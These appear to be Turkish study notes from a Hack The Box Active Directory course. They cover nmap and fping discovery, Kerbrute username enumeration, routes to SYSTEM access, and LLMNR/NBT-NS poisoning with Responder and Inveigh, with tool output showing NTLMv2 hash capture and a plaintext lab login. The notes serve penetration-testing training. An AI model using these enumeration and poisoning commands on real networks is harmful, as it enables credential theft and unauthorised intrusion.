Bu taramaların sonuçları, yalnızca host taraması değil, potansiyel domain numaralandırma yollarını aramaya nereden başlayacağımız konusunda bize ipucu verecektir. Bir domain kullanıcı hesabına giden yolu bulmamız gerekiyor. Sonuçlarımıza baktığımızda, domain hizmetlerini (DC01, MX01, WS01, vb.) barındıran birkaç sunucu bulduk. Artık neyin var olduğunu ve hangi hizmetlerin çalıştığını bildiğimize göre, bu sunucuları yoklayabilir ve kullanıcıları numaralandırmayı deneyebiliriz. Nmap taramaları gerçekleştirirken en iyi uygulama olarak -oA bayrağını kullandığınızdan emin olun. Bu, tarama sonuçlarımızın günlük tutma amacıyla çeşitli formatlarda ve manipüle edilebilecek ve diğer araçlara beslenebilecek formatlarda olmasını sağlayacaktır.

Hangi taramaları çalıştırdığımızın ve bunların nasıl çalıştığının farkında olmamız gerekir. Nmap komut dosyalı taramalardan bazıları, bir host'a karşı sistem kararsızlığına neden olabilecek veya onu çevrimdışı hale getirebilecek, müşteri için sorunlara veya daha kötüsüne neden olabilecek aktif güvenlik açığı kontrolleri çalıştırır. Örneğin, sensörler veya mantık denetleyicileri gibi cihazların bulunduğu bir ağa karşı büyük bir keşif taraması çalıştırmak, potansiyel olarak bunları aşırı yükleyebilir ve müşterinin endüstriyel ekipmanını bozarak ürün veya kapasite kaybına neden olabilir. Bir müşterinin ortamında çalıştırmadan önce kullandığınız taramaları anlamak için zaman ayırın.

Bu sonuçlara büyük olasılıkla daha sonra daha fazla numaralandırma için geri döneceğiz, bu yüzden onları unutmayın. Domain'e bağlı bir hostta bir domain kullanıcı hesabına ya da SYSTEM seviyesinde erişime ulaşmamız gerekiyor, böylece bir yer edinebilir ve asıl eğlenceye başlayabiliriz. Bir kullanıcı hesabı bulmaya başlayalım.


### Kullanıcıları Tanımlama
Müşterimiz bize teste başlamamız için bir kullanıcı sağlamazsa (ki genellikle böyle olur), bir kullanıcı için açık metin kimlik bilgileri veya bir NTLM parola hash'i, domain'e bağlı bir hostta bir SYSTEM shell'i veya bir domain kullanıcı hesabı bağlamında bir shell elde ederek domain'de bir dayanak noktası oluşturmanın bir yolunu bulmamız gerekecektir. Kimlik bilgilerine sahip geçerli bir kullanıcı elde etmek, iç sızma testinin ilk aşamalarında kritik öneme sahiptir. Bu erişim (en düşük seviyede bile olsa) numaralandırma ve hatta saldırı gerçekleştirmek için birçok fırsat sunar. Daha sonra değerlendirmemizde kullanmak üzere bir domain'deki geçerli kullanıcıların listesini toplamaya başlamanın bir yolunu inceleyelim.


### Kerbrute - İç AD Kullanıcı Adı Numaralandırma
[Kerbrute](https://github.com/ropnop/kerbrute), domain hesap numaralandırması için daha gizli bir seçenek olabilir. Kerberos ön kimlik doğrulama hatalarının genellikle günlükleri veya uyarıları tetiklemeyeceği gerçeğinden yararlanır. Kerbrute'u [Insidetrust](https://github.com/insidetrust/statistically-likely-usernames)'tan jsmith.txt veya jsmith2.txt kullanıcı listeleri ile birlikte kullanacağız. Bu depo, kimliği doğrulanmamış bir perspektiften başlarken kullanıcıları numaralandırmaya çalışırken son derece yararlı olabilecek birçok farklı kullanıcı listesi içerir. Kerbrute'u daha önce bulduğumuz DC'ye yönlendirebilir ve ona bir kelime listesi verebiliriz. Araç hızlıdır ve bulunan hesapların geçerli olup olmadığını bize bildiren sonuçlar sağlayacaktır, bu da bu modülün ilerleyen bölümlerinde derinlemesine ele alacağımız parola püskürtme gibi saldırıları başlatmak için harika bir başlangıç noktasıdır.

Kerbrute ile çalışmaya başlamak için, Linux, Windows ve Mac'ten test etmek üzere aracın önceden derlenmiş binary'lerini [indirebilir](https://github.com/ropnop/kerbrute/releases/tag/v1.0.3) veya kendimiz derleyebiliriz. Bu genellikle bir istemci ortamına sunduğumuz herhangi bir araç için en iyi uygulamadır. Seçtiğimiz sistemde kullanmak üzere binaryleri derlemek için önce repoyu klonlarız:


#### Cloning Kerbrute GitHub Repo
![Pasted image 20241002193555.png](/img/user/resimler/Pasted%20image%2020241002193555.png)

make help yazmak bize mevcut derleme seçeneklerini gösterecektir.


#### Listing Compiling Options
![Pasted image 20241002193616.png](/img/user/resimler/Pasted%20image%2020241002193616.png)
Sadece bir binary derlemeyi seçebilir veya ==make all== yazıp Linux, Windows ve Mac sistemlerinde (her biri için bir x86 ve x64 sürümü) kullanılmak üzere birer tane derleyebiliriz.


### Çoklu Platformlar ve Mimariler için Derleme
![Pasted image 20241002201121.png](/img/user/resimler/Pasted%20image%2020241002201121.png)
Yeni oluşturulan dist dizini derlenmiş ikili dosyalarımızı içerecektir.

### Derlenen İkilileri dist içinde listeleme

```shell-session
M1R4CKCK@htb[/htb]$ ls dist/

kerbrute_darwin_amd64  kerbrute_linux_386  kerbrute_linux_amd64  kerbrute_windows_386.exe  kerbrute_windows_amd64.exe
```
Daha sonra düzgün çalıştığından emin olmak için binary'yi test edebiliriz. Hedef ortamda sağlanan Parrot Linux saldırı hostu üzerinde x64 sürümünü kullanacağız.


#### Testing the kerbrute_linux_amd64 Binary
![Pasted image 20241002201237.png](/img/user/resimler/Pasted%20image%2020241002201237.png)

Aracı, hostun herhangi bir yerinden kolayca erişilebilir hale getirmek için PATH'imize ekleyebiliriz.

#### Adding the Tool to our Path
```shell-session
M1R4CKCK@htb[/htb]$ echo $PATH
/home/htb-student/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/snap/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/htb-student/.dotnet/tools
```


#### Moving the Binary
![Pasted image 20241002201322.png](/img/user/resimler/Pasted%20image%2020241002201322.png)
Artık sistemdeki herhangi bir konumdan ==kerbrute== yazabiliriz ve araca erişebiliriz. Sisteminizde takip etmekten ve yukarıdaki adımları uygulamaktan çekinmeyin. Şimdi ilk kullanıcı adı listesini toplamak için aracı kullanma örneğini inceleyelim.


### Kerbrute ile Kullanıcıları Numaralandırma
![Pasted image 20241002201430.png](/img/user/resimler/Pasted%20image%2020241002201430.png)

```shell-session
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```
Çıktılarımızdan INLANEFREIGHT.LOCAL domainindeki 56 kullanıcıyı doğruladığımızı ve bunu yapmanın sadece birkaç saniye sürdüğünü görebiliriz. Şimdi bu sonuçları alıp hedefli password spreyleme saldırılarında kullanmak üzere bir liste oluşturabiliriz.


### Potansiyel Güvenlik Açıklarının Belirlenmesi
[Local system](https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account) account NT AUTHORITY\SYSTEM, Windows işletim sistemlerinde built-in bir hesaptır. İşletim sistemindeki en yüksek erişim düzeyine sahiptir ve çoğu Windows servisini çalıştırmak için kullanılır. Üçüncü taraf servislerinin varsayılan olarak bu hesap bağlamında çalışması da çok yaygındır. Domain'e katılmış bir host üzerindeki SYSTEM hesabı, aslında başka bir tür kullanıcı hesabı olan bilgisayar hesabını taklit ederek Active Directory'yi numaralandırabilir. Bir domain ortamında SYSTEM düzeyinde erişime sahip olmak neredeyse bir domain kullanıcı hesabına sahip olmakla eşdeğerdir.

Bir host üzerinde SYSTEM düzeyinde erişim elde etmenin, bunlarla sınırlı olmamak üzere, çeşitli yolları vardır:

* MS08-067, EternalBlue veya BlueKeep gibi Remote Windows açıkları.
* SYSTEM hesabı bağlamında çalışan bir servisi kötüye kullanma veya[ Juicy Potato](https://github.com/ohpe/juicy-potato) kullanarak servis hesabı SeImpersonate ayrıcalıklarını kötüye kullanma. Bu tür bir saldırı eski Windows işletim sistemlerinde mümkündür ancak Windows Server 2019'da her zaman mümkün değildir.
* Windows 10 Task Scheduler 0-day gibi Windows işletim sistemlerindeki yerel ayrıcalık yükseltme kusurları.
* Lokal bir hesapla domain'e bağlı bir hostta yönetici erişimi elde etme ve bir SYSTEM cmd penceresi başlatmak için Psexec kullanma

Domain'e bağlı bir host üzerinde SYSTEM seviyesinde erişim elde ederek, bunlarla sınırlı olmamakla birlikte aşağıdaki gibi eylemleri gerçekleştirebilirsiniz:

* BloodHound ve PowerView gibi built-in araçları veya saldırgan araçları kullanarak domain'i numaralandırın.
* Aynı domain içerisinde Kerberoasting / ASREPRoasting saldırıları gerçekleştirin.
* Net-NTLMv2 hash'lerini toplamak veya SMB relay saldırıları gerçekleştirmek için Inveigh gibi araçları çalıştırın.
* Ayrıcalıklı bir domain kullanıcı hesabını ele geçirmek için token impersonation gerçekleştirin.
* ACL saldırıları gerçekleştirin.


### Bir Uyarı
Kullanmak için bir araç seçerken testin kapsamını ve tarzını aklınızda bulundurun. Her şeyin açıkta olduğu ve müşteri personelinin orada olduğunuzu bildiği, kaçamak olmayan bir sızma testi gerçekleştiriyorsanız, genellikle ne kadar gürültü yaptığınız önemli değildir. Ancak, kaçamak bir sızma testi, düşman değerlendirmesi veya kırmızı ekip katılımı sırasında, potansiyel bir saldırganın Araçlarını, Taktiklerini ve Prosedürlerini taklit etmeye çalışırsınız. Bunu akılda tutarak, gizlilik endişe vericidir. Tüm bir ağa Nmap atmak tam olarak sessiz değildir ve bir sızma testinde yaygın olarak kullandığımız araçların çoğu, eğitimli ve hazırlıklı bir SOC veya Mavi Takım Görevlisi için alarmları tetikleyecektir. Değerlendirmenizin amacını başlamadan önce müşteriyle her zaman yazılı olarak netleştirdiğinizden emin olun.

### Bir Kullanıcı Bulalım
Aşağıdaki birkaç bölümde, LLMNR/NBT-NS Poisoning ve password spraying gibi teknikleri kullanarak bir domain kullanıcı hesabını avlayacağız. Bu saldırılar bir yer edinmek için harika yollardır ancak dikkatli olunmalı ve araçlar ve teknikler anlaşılmalıdır. Şimdi bir kullanıcı hesabının peşine düşelim, böylece değerlendirmemizin bir sonraki aşamasına geçebilir ve domain'i parça parça ayırmaya ve çok sayıda yanlış yapılandırma ve kusur için derinlere inmeye başlayabiliriz.


Bölüm Özet : 

```shell-session
sudo -E wireshark
```
```shell-session
sudo tcpdump -i ens224 
```
```bash
sudo responder -I ens224 -A 
```
```shell-session
fping -asgq 172.16.5.0/23
```
```bash
sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum
```
```shell-session
nmap -A 172.16.5.100
```
```shell-session
sudo git clone https://github.com/ropnop/kerbrute.git
```
```shell-session
make help
```
```shell-session
sudo make all
```
```shell-session
./kerbrute_linux_amd64 
```
```shell-session
$ echo $PATH
/home/htb-student/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/snap/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/htb-student/.dotnet/tools
```
```shell-session
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
```
```shell-session
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```


Çözüm :
1- xfreerdp /v:10.129.201.114 /u:htb-student /p:HTB_@cademy_stdnt!
2- wireshark, tcpdump responder  araçlarını kullandım fakat en önemli sonucu fping ile aldım .
![Pasted image 20241002204744.png](/img/user/resimler/Pasted%20image%2020241002204744.png)
3- Çıktıdaki ip'leri host.txt dosyasına kayıt ettim ve nmap çalıştırdım . 

* sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum

[[Output\|Output]] : Çıktıyı incelediğimizde birden fazla commonName var . İnceleme sonucunda şu sonuca ulaştık : 
![Pasted image 20241002210309.png](/img/user/resimler/Pasted%20image%2020241002210309.png)

4- İkinci soru için aynı nmap sorgusunda sql server'ı bulunduran ip'yi arıyoruz . (172.16.5.130)
![Pasted image 20241002210622.png](/img/user/resimler/Pasted%20image%2020241002210622.png)




# LLMNR/NBT-NS Poisoning - from Linux
Bu noktada, domain ile ilgili ilk numaralandırma işlemimizi tamamladık. Bazı temel kullanıcı ve grup bilgilerini elde ettik, kritik hizmetleri ve Domain Controller gibi rolleri ararken hostları numaralandırdık ve domain için kullanılan adlandırma şeması gibi bazı özellikleri bulduk. Bu aşamada, iki farklı teknik üzerinde yan yana çalışacağız: ==network poisoning== and ==password spraying.== Bu eylemleri, bir domain kullanıcı hesabı için geçerli açık metin kimlik bilgilerini elde etmek amacıyla gerçekleştireceğiz, böylece kimlik bilgileri açısından numaralandırmanın bir sonraki aşamasına başlamak için domain'de bir dayanak noktası elde edeceğiz.

Bu bölüm ve bir sonraki bölüm, kimlik bilgilerini toplamanın ve bir değerlendirme sırasında ilk dayanağı elde etmenin yaygın bir yolunu ele alacaktır: ==Link-Local Multicast Name Resolution== (LLMNR) ve NetBIOS Name Service (NBT-NS) yayınlarına yönelik bir Man-in-the-Middle saldırısı. Ağa bağlı olarak, bu saldırı çevrimdışı olarak kırılabilen düşük ayrıcalıklı veya yönetici düzeyinde parola hash'leri veya hatta açık metin kimlik bilgileri sağlayabilir. Bu modülde ele alınmasa da, bu hash'ler bazen çevrimdışı parola hash'ini kırmak zorunda kalmadan domain'deki bir host'a veya birden fazla host'a yönetici ayrıcalıklarıyla kimlik doğrulaması yapmak için bir SMB Relay saldırısı gerçekleştirmek için de kullanılabilir. Hadi başlayalım!


## LLMNR & NBT-NS Primer
[Link-Local Multicast Name Resolution](https://datatracker.ietf.org/doc/html/rfc4795) (LLMNR) ve [NetBIOS Name Service](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc940063(v=technet.10)?redirectedfrom=MSDN) (NBT-NS), DNS başarısız olduğunda kullanılabilecek alternatif host tanımlama yöntemleri olarak hizmet veren Microsoft Windows bileşenleridir. Bir makine bir hostu çözümlemeye çalışır ancak DNS çözümlemesi başarısız olursa, tipik olarak, makine LLMNR aracılığıyla local ağdaki diğer tüm makinelerden doğru host adresini istemeye çalışacaktır. LLMNR, Domain Name System (DNS) formatını temel alır ve aynı lokal bağlantıdaki hostların diğer hostlar için name resolution yapmasına izin verir. Local olarak UDP üzerinden ==5355== numaralı portu kullanır. LLMNR başarısız olursa, NBT-NS kullanılacaktır. NBT-NS lokal ağ üzerindeki sistemleri NetBIOS isimlerine göre tanımlar. NBT-NS, UDP üzerinden ==137== numaralı portu kullanır.

Buradaki en önemli nokta, name resolution için LLMNR/NBT-NS kullanıldığında, ağdaki HERHANGİ bir hostun cevap verebilmesidir. Bu istekleri zehirlemek için ==Responder== ile devreye girdiğimiz yer burasıdır. Ağ erişimi ile, LLMNR ve NBT-NS trafiğine istekte bulunan host için bir cevabı varmış gibi yanıt vererek yayın alanındaki yetkili bir name resolution kaynağını (bu durumda, ağ segmentine ait olması gereken bir host) taklit edebiliriz. Bu zehirleme çabası, haydut sistemimizin talep edilen hostun yerini biliyormuş gibi davranarak kurbanların sistemimizle iletişim kurmasını sağlamak için yapılır. Talep edilen host name resolution veya authentication eylemleri gerektiriyorsa, NetNTLM hash'ini yakalayabilir ve açık metin şifresini almak için çevrimdışı bir Brute Force saldırısına maruz bırakabiliriz. Yakalanan kimlik doğrulama isteği başka bir host'a erişmek için aktarılabilir veya aynı host üzerinde farklı bir protokole (LDAP gibi) karşı kullanılabilir. LLMNR/NBNS sahtekarlığı SMB imzalama eksikliği ile birleştiğinde genellikle bir domain içindeki hostlara yönetici erişimine yol açabilir. SMB Relay saldırıları, Lateral Movement hakkında daha sonraki bir modülde ele alınacaktır.

![Pasted image 20241014092115.png](/img/user/resimler/Pasted%20image%2020241014092115.png)


### Quick Example - LLMNR/NBT-NS Poisoning
Saldırı akışının çok yüksek düzeyde hızlı bir örneğini inceleyelim:
1.Bir host, \print01.inlanefreight.local adresindeki yazıcı sunucusuna bağlanmaya çalışır, ancak yanlışlıkla \printer01.inlanefreight.local yazar.

2.DNS sunucusu yanıt verir ve bu hostun bilinmediğini söyler.

3.Host, tüm local ağa broadcast yaparak \printer01.inlanefreight.local'in yerini bilen olup olmadığını sorar.

4.Saldırgan (biz, ==Responder== çalıştırarak), hosta yanıt vererek, aradığı hostun \printer01.inlanefreight.local olduğunu söyler.

5.Host bu yanıta inanır ve saldırgana username ve NTLMv2 password hash ile bir authentication request gönderir.

6.Bu hash daha sonra offline olarak kırılabilir veya doğru koşullar mevcutsa bir SMB Relay saldırısında kullanılabilir.


## TTPs
Bu eylemleri, ağ üzerinden NTLMv1 ve NTLMv2 parola hash'leri şeklinde gönderilen kimlik doğrulama bilgilerini toplamak için gerçekleştiriyoruz. Active Directory'ye Giriş modülünde tartışıldığı gibi, NTLMv1 ve NTLMv2, LM veya NT hash'ini kullanan kimlik doğrulama protokolleridir. Daha sonra bu hash'leri alıp Hashcat veya John gibi araçlar kullanarak çevrimdışı olarak kırmaya çalışacağız ve şu anda sahip olduğumuz bir hesaptan daha fazla ayrıcalığa sahip bir hesabın parola hash'ini ele geçirirsek, ilk dayanağımızı elde etmek veya domain içindeki erişimimizi genişletmek için kullanılmak üzere hesabın açık metin parolasını elde etmeyi hedefleyeceğiz.

LLMNR & NBT-NS zehirlenmesini denemek için çeşitli araçlar kullanılabilir:

* [Responder](https://github.com/lgandx/Responder) : Responder, birçok farklı işleve sahip LLMNR, NBT-NS ve MDNS'yi zehirlemek için özel olarak oluşturulmuş bir araçtır.
* [Inveigh](https://github.com/Kevin-Robertson/Inveigh) : Inveigh, spoofing ve zehirleme saldırıları için kullanılabilen platformlar arası bir MITM platformudur.
* [Metasploit](https://www.metasploit.com/) : Metasploit, zehirleme saldırılarıyla başa çıkmak için yapılmış çeşitli yerleşik tarayıcılara ve sahtekarlık modüllerine sahiptir.

Bu bölümde ve bir sonraki bölümde parola karmalarını yakalamak ve çevrimdışı olarak kırmaya çalışmak için Responder ve Inveigh kullanımına ilişkin örnekler gösterilecektir. Genellikle dahili bir sızma testine müşterinin dahili ağındaki anonim bir konumdan bir Linux saldırı hostu ile başlarız. Responder gibi araçlar, daha sonra daha fazla numaralandırma ve saldırı yoluyla genişletebileceğimiz bir dayanak noktası oluşturmak için harikadır. Responder Python'da yazılmıştır ve genellikle Linux saldırı hostunda kullanılır, ancak Windows'ta çalışan bir .exe sürümü de vardır. Inveigh hem C# hem de PowerShell (eski olarak kabul edilir) dillerinde yazılmıştır. Her iki araç da aşağıdaki protokollere saldırmak için kullanılabilir:
- LLMNR
- DNS
- MDNS
- NBNS
- DHCP
- ICMP
- HTTP
- HTTPS
- SMB
- LDAP
- WebDAV
- Proxy Auth
Responder ayrıca aşağıdakiler için de desteğe sahiptir:
- MSSQL
- DCE-RPC
- FTP, POP3, IMAP, and SMTP auth


### Responder In Action




# LLMNR/NBT-NS Poisoning - from Windows
LLMNR & NBT-NS zehirlenmesi bir Windows hostundan da mümkündür. Son bölümde, hash'leri yakalamak için Responder'ı kullandık. Bu bölümde [Inveigh](https://github.com/Kevin-Robertson/Inveigh) aracını keşfedecek ve başka bir kimlik bilgisi kümesini yakalamaya çalışacağız.

## **Inveigh - Genel Bakış**  

Saldırı kutumuz olarak bir Windows hostu bulursak, müşterimiz bize test etmemiz için bir Windows kutusu sağlarsa veya başka bir saldırı yöntemiyle local admin olarak bir Windows hostuna girersek ve erişimimizi ilerletmek istersek, [Inveigh](“https://github.com/Kevin-Robertson/Inveigh”) aracı Responder'a benzer şekilde çalışır, ancak PowerShell ve C# ile yazılmıştır. Inveigh, IPv4 ve IPv6 ile `LLMNR`, DNS, `mDNS`, NBNS, `DHCPv6`, ICMPv6, `HTTP`, HTTPS, `SMB`, LDAP, `WebDAV` ve Proxy Auth dahil olmak üzere diğer birçok protokolü dinleyebilir. Tool, sağlanan Windows saldırı hostunda `C:\Tools` dizininde mevcuttur.

PowerShell versiyonu ile aşağıdaki gibi başlayabilir ve ardından tüm olası parametreleri listeleyebiliriz. Tüm parametreleri ve kullanım talimatlarını listeleyen bir [wiki](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters) var.


## Using Inveigh
![Pasted image 20241018131337.png](/img/user/resimler/Pasted%20image%2020241018131337.png)
Inveigh'i LLMNR ve NBNS spoofing ile başlatalım ve konsola çıktı verelim ve bir dosyaya yazalım. [Burada](“https://github.com/Kevin-Robertson/Inveigh#parameter-help”) görülebilecek olan varsayılanların geri kalanını bırakacağız.

```powershell-session
PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y

[*] Inveigh 1.506 started at 2022-02-28T19:26:30
[+] Elevated Privilege Mode = Enabled
[+] Primary IP Address = 172.16.5.25
[+] Spoofer IP Address = 172.16.5.25
[+] ADIDNS Spoofer = Disabled
[+] DNS Spoofer = Enabled
[+] DNS TTL = 30 Seconds
[+] LLMNR Spoofer = Enabled
[+] LLMNR TTL = 30 Seconds
[+] mDNS Spoofer = Disabled
[+] NBNS Spoofer For Types 00,20 = Enabled
[+] NBNS TTL = 165 Seconds
[+] SMB Capture = Enabled
[+] HTTP Capture = Enabled
[+] HTTPS Certificate Issuer = Inveigh
[+] HTTPS Certificate CN = localhost
[+] HTTPS Capture = Enabled
[+] HTTP/HTTPS Authentication = NTLM
[+] WPAD Authentication = NTLM
[+] WPAD NTLM Authentication Ignore List = Firefox
[+] WPAD Response = Enabled
[+] Kerberos TGT Capture = Disabled
[+] Machine Account Capture = Disabled
[+] Console Output = Full
[+] File Output = Enabled
[+] Output Directory = C:\Tools
WARNING: [!] Run Stop-Inveigh to stop
[*] Press any key to stop console output
WARNING: [-] [2022-02-28T19:26:31] Error starting HTTP listener
WARNING: [!] [2022-02-28T19:26:31] Exception calling "Start" with "0" argument(s): "An attempt was made to access a
socket in a way forbidden by its access permissions" $HTTP_listener.Start()
[+] [2022-02-28T19:26:31] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
[+] [2022-02-28T19:26:31] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
[+] [2022-02-28T19:26:31] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent]
[+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
[+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
[+] [2022-02-28T19:26:32] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent]
[+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
[+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
[+] [2022-02-28T19:26:32] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent]
[+] [2022-02-28T19:26:33] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
[+] [2022-02-28T19:26:33] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
[+] [2022-02-28T19:26:33] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent]
[+] [2022-02-28T19:26:34] TCP(445) SYN packet detected from 172.16.5.125:56834
[+] [2022-02-28T19:26:34] SMB(445) negotiation request detected from 172.16.5.125:56834
[+] [2022-02-28T19:26:34] SMB(445) NTLM challenge 7E3B0E53ADB4AE51 sent to 172.16.5.125:56834

<SNIP>
```

Hemen LLMNR ve mDNS istekleri almaya başladığımızı görebiliriz.
![Pasted image 20241018131703.png](/img/user/resimler/Pasted%20image%2020241018131703.png)


## C# Inveigh (InveighZero)
Inveigh'in PowerShell sürümü orijinal sürümdür ve artık güncellenmemektedir. Aracın yazarı, orijinal PoC C# kodunu ve PowerShell sürümündeki kodun çoğunun C# portunu birleştiren C# sürümünü korumaktadır. Aracın C# sürümünü kullanabilmemiz için önce çalıştırılabilir dosyayı derlememiz gerekir. Zaman kazanmak için, aracın hem PowerShell hem de derlenmiş çalıştırılabilir sürümünün bir kopyasını laboratuvardaki hedef hostta `C:\Tools` klasörüne ekledik, ancak Visual Studio kullanarak kendiniz derlemenin alıştırmasını (ve en iyi uygulamasını) yapmaya değer.  

Devam edelim ve C# sürümünü varsayılanlarla çalıştıralım ve karmaları yakalamaya başlayalım.

```powershell-session
PS C:\htb> .\Inveigh.exe

[*] Inveigh 2.0.4 [Started 2022-02-28T20:03:28 | PID 6276]
[+] Packet Sniffer Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]
[+] Listener Addresses [IP 0.0.0.0 | IPv6 ::]
[+] Spoofer Reply Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]
[+] Spoofer Options [Repeat Enabled | Local Attacks Disabled]
[ ] DHCPv6
[+] DNS Packet Sniffer [Type A]
[ ] ICMPv6
[+] LLMNR Packet Sniffer [Type A]
[ ] MDNS
[ ] NBNS
[+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80]
[ ] HTTPS
[+] WebDAV [WebDAVAuth NTLM]
[ ] Proxy
[+] LDAP Listener [Port 389]
[+] SMB Packet Sniffer [Port 445]
[+] File Output [C:\Tools]
[+] Previous Session Files (Not Found)
[*] Press ESC to enter/exit interactive console
[!] Failed to start HTTP listener on port 80, check IP and port usage.
[!] Failed to start HTTPv6 listener on port 80, check IP and port usage.
[ ] [20:03:31] mDNS(QM)(A) request [academy-ea-web0.local] from 172.16.5.125 [disabled]
[ ] [20:03:31] mDNS(QM)(AAAA) request [academy-ea-web0.local] from 172.16.5.125 [disabled]
[ ] [20:03:31] mDNS(QM)(A) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]
[ ] [20:03:31] mDNS(QM)(AAAA) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]
[+] [20:03:31] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent]
[-] [20:03:31] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]
[+] [20:03:31] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent]
[-] [20:03:31] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]
[ ] [20:03:32] mDNS(QM)(A) request [academy-ea-web0.local] from 172.16.5.125 [disabled]
[ ] [20:03:32] mDNS(QM)(AAAA) request [academy-ea-web0.local] from 172.16.5.125 [disabled]
[ ] [20:03:32] mDNS(QM)(A) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]
[ ] [20:03:32] mDNS(QM)(AAAA) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]
[+] [20:03:32] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent]
[-] [20:03:32] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]
[+] [20:03:32] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent]
[-] [20:03:32] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]
```

Gördüğümüz gibi, araç başlar ve hangi seçeneklerin varsayılan olarak etkin olduğunu ve hangilerinin olmadığını gösterir. Üzerinde `[+]` işareti olan seçenekler varsayılan olarak etkin, önünde `[ ]` işareti olanlar ise devre dışıdır. Çalışan konsol çıktısı da bize hangi seçeneklerin devre dışı bırakıldığını ve bu nedenle yanıtların gönderilmediğini gösterir (yukarıdaki örnekte mDNS). Ayrıca aracı çalıştırırken çok faydalı olan `Etkileşimli konsola girmek/çıkmak için ESC'ye basın` mesajını da görebiliriz. Konsol bize yakalanan kimlik bilgilerine/hash'lere erişim sağlar, Inveigh'i durdurmamızı sağlar ve daha fazlasını yapar.  

Inveigh çalışırken konsola girmek için `esc` tuşuna basabiliriz.
```powershell-session
<SNIP>

[+] [20:10:24] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent]
[+] [20:10:24] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent]
[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]
[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]
[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]
[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]
[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]
[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]
[.] [20:10:24] TCP(1433) SYN packet from 172.16.5.125:61310
[.] [20:10:24] TCP(1433) SYN packet from 172.16.5.125:61311
C(0:0) NTLMv1(0:0) NTLMv2(3:9)> HELP
```

`YARDIM` yazıp enter tuşuna bastıktan sonra karşımıza birkaç seçenek çıkıyor:

![Pasted image 20241018131953.png](/img/user/resimler/Pasted%20image%2020241018131953.png)

`GET NTLMV2UNIQUE` yazarak yakalanan benzersiz hash'leri hızlı bir şekilde görüntüleyebiliriz.

```powershell-session
================================================= Unique NTLMv2 Hashes =================================================

Hashes
========================================================================================================================
